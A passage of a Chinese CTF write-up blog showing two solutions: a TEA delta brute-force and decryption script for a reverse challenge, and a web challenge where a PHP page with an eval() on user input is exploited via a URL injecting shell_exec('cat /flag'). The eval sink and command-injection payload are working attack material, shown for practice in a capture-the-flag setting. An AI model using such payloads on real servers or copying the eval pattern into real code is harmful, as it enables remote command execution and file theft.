<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局配置</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> TARGET_DWORD = <span class="number">0x68626d67</span>; <span class="comment">// flag的对应映射hbmg</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> CIPHER_PART[<span class="number">2</span>] = &#123;<span class="number">0x5f6f8bf4</span>, <span class="number">0x3b31cec1</span>&#125;; <span class="comment">// 前8字节密文</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x00114514</span>, <span class="number">0x19198100</span>, <span class="number">0xDEADBEEF</span>, <span class="number">0x00070201</span>&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> DELTA_MAX = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> THREADS = std::thread::<span class="built_in">hardware_concurrency</span>();</span><br><span class="line"><span class="function">std::atomic&lt;<span class="type">uint32_t</span>&gt; <span class="title">g_progress</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="function">std::atomic&lt;<span class="type">bool</span>&gt; <span class="title">g_found</span><span class="params">(<span class="literal">false</span>)</span></span>;</span><br><span class="line"><span class="comment">// 进度监控</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">progress_monitor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!g_found) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> current = g_progress;</span><br><span class="line">        <span class="type">float</span> percent = (<span class="type">float</span>)current / DELTA_MAX * <span class="number">100</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;\rProgress: &quot;</span> &lt;&lt; current &lt;&lt; <span class="string">&quot;/&quot;</span> &lt;&lt; DELTA_MAX </span><br><span class="line">                  &lt;&lt; <span class="string">&quot; (&quot;</span> &lt;&lt; percent &lt;&lt; <span class="string">&quot;%)          &quot;</span>;</span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">seconds</span>(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解密函数（针对前8字节）</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_delta</span><span class="params">(<span class="type">uint32_t</span> delta)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = CIPHER_PART[<span class="number">0</span>], v1 = CIPHER_PART[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> ttl = delta * <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j) &#123;</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + ttl) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>])));</span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + ttl) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>])));</span><br><span class="line">        ttl -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (v0 == TARGET_DWORD); <span class="comment">// 只检查第一个DWORD</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 线程任务</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search_range</span><span class="params">(<span class="type">uint32_t</span> start, <span class="type">uint32_t</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> delta = start; delta &lt; end &amp;&amp; !g_found; ++delta) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check_delta</span>(delta)) &#123;</span><br><span class="line">            g_found = <span class="literal">true</span>;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;\nFound valid delta: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; delta &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((delta - start) % <span class="number">0x1000</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            g_progress.<span class="built_in">fetch_add</span>(<span class="number">0x1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;std::thread&gt; threads;</span><br><span class="line">    <span class="function">std::thread <span class="title">monitor</span><span class="params">(progress_monitor)</span></span>;</span><br><span class="line">    <span class="comment">// 分割任务</span></span><br><span class="line">    <span class="type">uint32_t</span> range = DELTA_MAX / THREADS;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; THREADS; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> start = i * range;</span><br><span class="line">        <span class="type">uint32_t</span> end = (i == THREADS<span class="number">-1</span>) ? DELTA_MAX : start + range;</span><br><span class="line">        threads.<span class="built_in">emplace_back</span>(search_range, start, end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; t : threads) t.<span class="built_in">join</span>();</span><br><span class="line">    monitor.<span class="built_in">join</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行输出delta：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Progress: 0/4294967295 (0%)</span><br><span class="line">Found valid delta: 0x48315716</span><br></pre></td></tr></table></figure>
<p>用该delta进行解密：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">lowercase_map = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>, <span class="string">&#x27;mlkjihgfedcbazyxwvutsrqpon&#x27;</span>)</span><br><span class="line">uppercase_map = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="string">&#x27;MLKJIHGFEDCBAZYXWVUTSRQPON&#x27;</span>)</span><br><span class="line">digit_map = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;1234567890&#x27;</span>, <span class="string">&#x27;3210987654&#x27;</span>)</span><br><span class="line"></span><br><span class="line">de_lowercase_map = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;mlkjihgfedcbazyxwvutsrqpon&#x27;</span>, <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>)</span><br><span class="line">de_uppercase_map = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;MLKJIHGFEDCBAZYXWVUTSRQPON&#x27;</span>, <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>)</span><br><span class="line">de_digit_map = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;3210987654&#x27;</span>, <span class="string">&#x27;1234567890&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">map_enc</span>(<span class="params">input_string</span>):</span><br><span class="line">    result = input_string.translate(digit_map)</span><br><span class="line">    result = result.translate(lowercase_map)</span><br><span class="line">    result = result.translate(uppercase_map)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">map_dec</span>(<span class="params">input_string</span>):</span><br><span class="line">    result = input_string.translate(de_digit_map)</span><br><span class="line">    result = result.translate(de_lowercase_map)</span><br><span class="line">    result = result.translate(de_uppercase_map)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_hex_array</span>(<span class="params">string</span>):</span><br><span class="line">    array = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">        array.append(<span class="built_in">ord</span>(string[i]))</span><br><span class="line">    <span class="keyword">return</span> array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mapping</span>(<span class="params">input_string</span>):</span><br><span class="line">    enc = map_enc(input_string)</span><br><span class="line">    hex_array = to_hex_array(enc)</span><br><span class="line">    <span class="keyword">return</span> enc, hex_array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_mapping</span>(<span class="params">input_string</span>):</span><br><span class="line">    dec = map_dec(input_string)</span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwords_to_bytes_big_endian</span>(<span class="params">dword_array</span>):</span><br><span class="line">    byte_list = []</span><br><span class="line">    <span class="keyword">for</span> dword <span class="keyword">in</span> dword_array:</span><br><span class="line">        byte_list.extend(dword.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> byte_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_dwords_big_endian</span>(<span class="params">byte_array</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(byte_array[i:i+<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(byte_array), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">test = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">test = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">k = [<span class="number">0x00114514</span>, <span class="number">0x19198100</span>, <span class="number">0xDEADBEEF</span>, <span class="number">0x00070201</span>]</span><br><span class="line">enc, hex_enc = mapping(test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Original: <span class="subst">&#123;test&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;EncryptS: <span class="subst">&#123;enc&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;AfterTEA: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">dwordenc = bytes_to_dwords_big_endian(hex_enc)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    dwordenc.append(<span class="number">0</span>)</span><br><span class="line">dwordresult = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dwordenc)//<span class="number">2</span>):</span><br><span class="line">    v0 = dwordenc[<span class="number">2</span> * i]</span><br><span class="line">    v1 = dwordenc[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">    ttl = <span class="number">0</span></span><br><span class="line">    delta = <span class="number">0x4831BB6B</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">        ttl = (ttl + delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 + (((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + ttl) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 = (v1 + (((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + ttl) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    dwordresult.append(v0)</span><br><span class="line">    dwordresult.append(v1)</span><br><span class="line">result = dwords_to_bytes_big_endian(dwordresult)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(result[i]),end=<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">dwordresult = [<span class="number">0x5f6f8bf4</span>, <span class="number">0x3b31cec1</span>, <span class="number">0xf66376bd</span>, <span class="number">0xc5ae96f0</span>, <span class="number">0xabbcd6a9</span>, </span><br><span class="line">               <span class="number">0x09a7afc5</span>, <span class="number">0x3eca585a</span>, <span class="number">0xb5d7c589</span>, <span class="number">0x8da5b9c8</span>, <span class="number">0x241108e6</span>]</span><br><span class="line">dwordrev = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dwordresult)//<span class="number">2</span>):</span><br><span class="line">    v0 = dwordresult[<span class="number">2</span> * i]</span><br><span class="line">    v1 = dwordresult[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x48315716</span></span><br><span class="line">    ttl = (<span class="number">0x40</span> * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + ttl) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + ttl) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        ttl = (ttl - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    dwordrev.append(v0)</span><br><span class="line">    dwordrev.append(v1)</span><br><span class="line">rev = dwords_to_bytes_big_endian(dwordrev)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;BeforTEA: &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">bflag = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rev)):</span><br><span class="line">    bflag.append(rev[i])</span><br><span class="line"><span class="built_in">print</span>(bflag)</span><br><span class="line">mapflag = bflag.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OutpFlag:&quot;</span>, de_mapping(mapflag))</span><br></pre></td></tr></table></figure>
<p>输出flag：<font color=deepskyblue><strong>flag{Ru57_and_g0_1s_fun_T0_r3v3rs3_XD}</strong></font>.</p>
<h1 id="Web方向："><a href="#Web方向：" class="headerlink" title="Web方向："></a>Web方向：</h1><h2 id="play-a-game："><a href="#play-a-game：" class="headerlink" title="play a game："></a>play a game：</h2><p>查看源代码，发现游戏结束之后会打开一个php：<code>window.open(&quot;check.php?score=&quot;+this.score);</code>，跳转该php，发现输出MTE0NTE0说:你的分数不是它想要的，而MTE0NTE0是114514的base64，带入score&#x3D;114514后得到了php文件的源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error\<span class="title function_ invoke__">_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(base64\<span class="title function_ invoke__">_encode</span>($\_GET[<span class="string">&#x27;score&#x27;</span>]) == <span class="string">&#x27;MTE0NTE0&#x27;</span>) &#123;</span><br><span class="line">`    `highlight\<span class="title function_ invoke__">_file</span>(\_\_FILE\_\_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;MTE0NTE0说:你的分数不是它想要的&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span>=$\_GET[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span>=$\_GET[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$func</span>!=<span class="variable">$arg</span>||<span class="title function_ invoke__">md5</span>(<span class="variable">$func</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$arg</span>))&#123;</span><br><span class="line">`    `<span class="keyword">eval</span>(<span class="variable">$func</span>.<span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现可以传入func和arg并执行，构造查看flag的指令：<code>check.php?score=114514&amp;func=echo%20shell_exec(%27cat%20/flag%27);&amp;arg=</code></p>
<p>返回flag：<font color=deepskyblue><strong>flag{IF_YOU-fE3L-T1R3D-yOu-Can_PI4y_iT130b5a}</strong></font>.</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/03/16/nssctf_round27/"
      title="NSSCTF Round#27 Basic Reverse个人赛 WriteUp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        NSSCTF Round#27 Basic Reverse个人赛 WriteUp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/03/09/ghctf_25/"
      title="GHCTF 2025 WriteUp"
     >

    <p class="title-text">
      
        GHCTF 2025 WriteUp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Astral Prisma<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
